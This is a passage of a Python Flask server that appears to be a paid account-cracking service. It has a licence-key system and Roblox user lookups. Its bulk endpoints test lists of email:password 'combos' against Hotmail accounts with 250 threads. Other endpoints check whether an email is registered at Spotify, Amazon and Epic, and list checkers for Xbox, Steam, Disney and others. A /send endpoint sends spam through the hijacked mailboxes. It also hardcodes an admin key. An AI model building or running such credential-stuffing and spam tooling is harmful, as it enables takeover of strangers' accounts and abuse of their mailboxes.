            rap_data = await responses[6].json() if not isinstance(responses[6], Exception) else {}
            
            is_verified = False
            for response in responses[7:]:
                if not isinstance(response, Exception) and response.status == 200:
                    try:
                        data = await response.json()
                        if data.get('data') and len(data['data']) > 0:
                            is_verified = True
                            break
                    except:
                        continue

            past_usernames = [entry['name'] for entry in username_data.get('data', [])]
            groups = [{
                'groupId': group['group']['id'],
                'name': group['group']['name'],
                'memberCount': group['group']['memberCount'],
                'role': group['role']['name']
            } for group in groups_data.get('data', [])]

            thumbnails = {
                'avatarThumbnail': avatar_data['data'][0]['imageUrl'] if avatar_data.get('data') else None,
                'faceThumbnail': headshot_data['data'][0]['imageUrl'] if headshot_data.get('data') else None
            }

            presence_info = presence_data.get('userPresences', [{}])[0]
            rap_info = rap_data if rap_data.get("success") else {}

            return jsonify({
                'username': username,
                'displayName': user_info.get('displayName', username),
                'userId': user_id,
                'description': user_info.get('description', 'No description available.'),
                'rap': rap_info.get('rap', 0),
                'value': rap_info.get('value', 0),
                'private': rap_info.get('privacy_enabled', False),
                'thumbnails': thumbnails,
                'creationDate': user_info.get('created'),
                'lastOnline': presence_info.get('lastOnline'),
                'lastLocation': presence_info.get('lastLocation', 'Unknown'),
                'verified': is_verified,
                'isBanned': user_info.get('isBanned', False),
                'pastUsernamesCount': len(past_usernames),
                'pastUsernames': past_usernames,
                'groupsCount': len(groups),
                'groups': groups
            }), 200

        except Exception as e:
            return jsonify({'error': 'Error processing user data'}), 500

async def check_user_owns_item(user_id, item_id):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{item_id}"
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return len(data.get('data', [])) > 0
                else:
                    return None
    except Exception as e:
        return None

@app.route('/get/item/<user_input>/<int:item_id>', methods=['GET'])
async def check_item_ownership(user_input, item_id):
    user_id, username = await get_or_convert_user_id(user_input)
    if user_id is None:
        return jsonify({'error': 'Invalid username or user ID', 'input': user_input}), 404

    owns_item = await check_user_owns_item(user_id, item_id)
    if owns_item is None:
        return jsonify({'error': 'Unable to check item ownership', 'userId': user_id, 'username': username, 'itemId': item_id}), 500

    return jsonify({
        'userId': user_id,
        'username': username,
        'itemId': item_id,
        'ownsItem': owns_item
    }), 200

VALID_KEYS = {}  # Format: {key: {"hwid": hwid, "ip": ip, "expires": datetime}}

@app.route('/auth/<key>', methods=['GET'])
def verify_key(key):
    try:
        if key not in VALID_KEYS:
            return jsonify({"valid": False, "message": "Invalid key"})
            
        key_data = VALID_KEYS[key]
        client_ip = request.remote_addr
        client_hwid = request.headers.get('X-HWID')
        
        if not client_hwid:
            return jsonify({"valid": False, "message": "HWID required"})
            
        if datetime.now() > key_data["expires"]:
            del VALID_KEYS[key]
            return jsonify({"valid": False, "message": "Key expired"})
            
        if key_data["hwid"] and key_data["hwid"] != client_hwid:
            return jsonify({"valid": False, "message": "HWID mismatch"})
            
        if key_data["ip"] and key_data["ip"] != client_ip:
            return jsonify({"valid": False, "message": "IP mismatch"})
            
        if not key_data["hwid"]:
            key_data["hwid"] = client_hwid
            
        if not key_data["ip"]:
            key_data["ip"] = client_ip
            
        return jsonify({"valid": True})
        
    except Exception as e:
        return jsonify({"valid": False, "message": str(e)})

@app.route('/create_key', methods=['POST'])
def create_key():
    try:
        data = request.get_json()
        if not data or 'admin_key' not in data or data['admin_key'] != 'StarlightSuperCool2':
            return jsonify({"status": "error", "message": "Unauthorized"}), 401
            
        days = data.get('days', 30)
        key = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        
        VALID_KEYS[key] = {
            "hwid": None,
            "ip": None,
            "expires": datetime.now() + timedelta(days=days)
        }
        
        return jsonify({
            "status": "success",
            "key": key,
            "expires": VALID_KEYS[key]["expires"].isoformat()
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/list_keys', methods=['POST'])
def list_keys():
    try:
        data = request.get_json()
        if not data or 'admin_key' not in data or data['admin_key'] != 'StarlightSuperCool2':
            return jsonify({"status": "error", "message": "Unauthorized"}), 401
            
        keys_info = {}
        for key, data in VALID_KEYS.items():
            keys_info[key] = {
                "hwid": data["hwid"],
                "ip": data["ip"],
                "expires": data["expires"].isoformat(),
                "days_left": (data["expires"] - datetime.now()).days
            }
            
        return jsonify({
            "status": "success",
            "keys": keys_info
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/revoke_key', methods=['POST'])
def revoke_key():
    try:
        data = request.get_json()
        if not data or 'admin_key' not in data or data['admin_key'] != 'StarlightSuperCool2':
            return jsonify({"status": "error", "message": "Unauthorized"}), 401
            
        key = data.get('key')
        if not key or key not in VALID_KEYS:
            return jsonify({"status": "error", "message": "Invalid key"}), 400
            
        del VALID_KEYS[key]
        return jsonify({"status": "success", "message": "Key revoked"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/bulk_solve', methods=['POST'])
def bulk_solve():
    try:
        data = request.get_json()
        if not data or 'combos' not in data:
            return jsonify({"status": "error", "message": "Combos list required (email:pass format)"}), 400

        combos = data['combos']
        search_params = data.get('search_params')
        results = {}

        def process_combo(combo):
            try:
                if ':' not in combo:
                    return combo, {
                        "status": "ERROR",
                        "message": "Invalid format - must be email:password"
                    }
                    
                email, password = combo.strip().split(':')
                checker = HotmailChecker()
                result = checker.check_account(email, password, search_params)
                return combo, result
            except Exception as e:
                return combo, {
                    "status": "ERROR",
                    "message": f"Failed to process combo: {str(e)}"
                }

        with ThreadPoolExecutor(max_workers=250) as executor:
            futures = []
            for combo in combos:
                futures.append(executor.submit(process_combo, combo))
            
            for future in concurrent.futures.as_completed(futures):
                key, result = future.result()
                results[key] = result

        return jsonify({
            "status": "success",
            "results": results
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/bulk_solve_full', methods=['POST'])
def bulk_solve_full():
    try:
        data = request.get_json()
        if not data or 'combos' not in data:
            return jsonify({"status": "error", "message": "Combos list required (email:pass format)"}), 400

        combos = data['combos']
        search_params = data.get('search_params')
        results = {}

        def process_combo_full(combo):
            try:
                if ':' not in combo:
                    return combo, {
                        "status": "ERROR",
                        "message": "Invalid format - must be email:password"
                    }
                    
                email, password = combo.strip().split(':')
                checker = HotmailChecker()
                result = checker.check_account_full(email, password, search_params)
                return combo, result
            except Exception as e:
                return combo, {
                    "status": "ERROR",
                    "message": f"Failed to process combo: {str(e)}"
                }

        with ThreadPoolExecutor(max_workers=250) as executor:
            futures = []
            for combo in combos:
                futures.append(executor.submit(process_combo_full, combo))
            
            for future in concurrent.futures.as_completed(futures):
                key, result = future.result()
                results[key] = result

        return jsonify({
            "status": "success",
            "results": results
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/vm', methods=['POST'])
def check_vm():
    try:
        data = request.get_json()
        if not data or 'type' not in data or 'email' not in data:
            return jsonify({"status": "error", "message": "Type and email required"}), 400

        service_type = data['type'].lower()
        email = data['email']

        if service_type == 'spotify':
            checker = SpotifyChecker()
            result = checker.check_email(email)
            return jsonify(result)
        elif service_type == 'amazon':
            result = check_amazon_email(email)
            return jsonify({
                "status": result,
                "message": "Account check completed"
            })
        elif service_type == 'epic':
            result = check_epic_email(email)
            return jsonify({
                "status": result,
                "message": "Account check completed"
            })
        else:
            return jsonify({
                "status": "error",
                "message": f"Invalid service type: {service_type}. Supported types: spotify, amazon, epic"
            }), 400

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error: {str(e)}"
        }), 500

@app.route('/vm/all', methods=['POST'])
def check_vm_all():
    try:
        data = request.get_json()
        if not data or 'email' not in data:
            return jsonify({"status": "error", "message": "Email required"}), 400

        email = data['email']
        results = {}

        def check_spotify():
            try:
                checker = SpotifyChecker()
                return checker.check_email(email)
            except Exception as e:
                return {"status": "Error", "message": str(e)}

        def check_amazon():
            try:
                result = check_amazon_email(email)
                return {
                    "status": result,
                    "message": "Account check completed"
                }
            except Exception as e:
                return {"status": "Error", "message": str(e)}

        def check_epic():
            try:
                result = check_epic_email(email)
                if isinstance(result, dict) and 'status' in result:
                    return result
                else:
                    return {
                        "status": result,
                        "message": "Account check completed"
                    }
            except Exception as e:
                return {"status": "Error", "message": str(e)}

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                'spotify': executor.submit(check_spotify),
                'amazon': executor.submit(check_amazon),
                'epic': executor.submit(check_epic)
            }

            for service, future in futures.items():
                try:
                    results[service] = future.result(timeout=30)
                except concurrent.futures.TimeoutError:
                    results[service] = {"status": "Error", "message": "Request timed out"}
                except Exception as e:
                    results[service] = {"status": "Error", "message": str(e)}

        return jsonify({
            "status": "success",
            "email": email,
            "results": results
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error: {str(e)}"
        }), 500

@app.route('/data')
def get_api_documentation():
    """Returns documentation for all available endpoints"""
    endpoints = {
        "account_checking": {
            "/check": {
                "method": "POST",
                "description": "Check account validity",
                "body": {
                    "type": "Account type (xbox, steam, disney, ubisoft, ipvanish)",
                    "email": "Email to check",
                    "password": "Password to check"
                }
            },
            "/solve": {
                "method": "POST",
                "description": "Check email/password combination",
                "body": {
                    "email": "Email to check",
                    "password": "Password to check",
                    "search_params": "Optional search parameters"
                }
            },
            "/solve_full": {
                "method": "POST",
                "description": "Check email/password with full details",
                "body": {
                    "email": "Email to check",
                    "password": "Password to check",
                    "search_params": "Optional search parameters"
                }
            },
            "/super_check": {
                "method": "POST",
                "description": "Advanced check for Roblox accounts with email validation",
                "body": {
                    "combos": "List of email:password combinations"
                }
            }
        },
        "bulk_operations": {
            "/bulk_solve": {
                "method": "POST",
                "description": "Check multiple email/password combinations",
                "body": {
                    "combos": "List of email:password combinations",
                    "search_params": "Optional search parameters"
                }
            },
            "/bulk_solve_full": {
                "method": "POST",
                "description": "Check multiple email/password combinations with full details",
                "body": {
                    "combos": "List of email:password combinations",
                    "search_params": "Optional search parameters"
                }
            }
        },
        "roblox": {
            "/recover": {
                "method": "POST",
                "description": "Recover a Roblox account",
                "body": {
                    "email": "Email to recover"
                }
            },
            "/recoverfile": {
                "method": "POST",
                "description": "Recover multiple Roblox accounts",
                "body": {
                    "emails": "List of emails to recover"
                }
            },
            "/get/all/<user_input>": {
                "method": "GET",
                "description": "Get all information about a Roblox user",
                "params": {
                    "user_input": "Roblox username or user ID"
                }
            }
        },
        "virtual_machine": {
            "/vm": {
                "method": "POST",
                "description": "Check email against various services",
                "body": {
                    "type": "Service type (spotify, amazon, epic)",
                    "email": "Email to check"
                }
            },
            "/vm/all": {
                "method": "POST",
                "description": "Check email against all supported services",
                "body": {
                    "email": "Email to check"
                }
            }
        },
        "system": {
            "/health": {
                "method": "GET",
                "description": "Check API health status"
            }
        }
    }
    
    return jsonify(endpoints)

@app.route('/send', methods=['POST'])
def send_email():
    try:
        data = request.get_json()
        if not data or 'email' not in data or 'password' not in data or 'recipient' not in data or 'message' not in data:
            return jsonify({"status": "ERROR", "message": "Missing required fields"}), 400

        email = data['email']
        password = data['password']
        recipient = data['recipient']
        message = data['message']
        subject = data.get('subject', 'No Subject')

        checker = HotmailChecker()
        result = checker.spam_email(email, password, recipient, subject, message)
        return jsonify(result)

    except Exception as e:
        return jsonify({
            "status": "ERROR",
            "message": str(e),
            "traceback": traceback.format_exc()
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)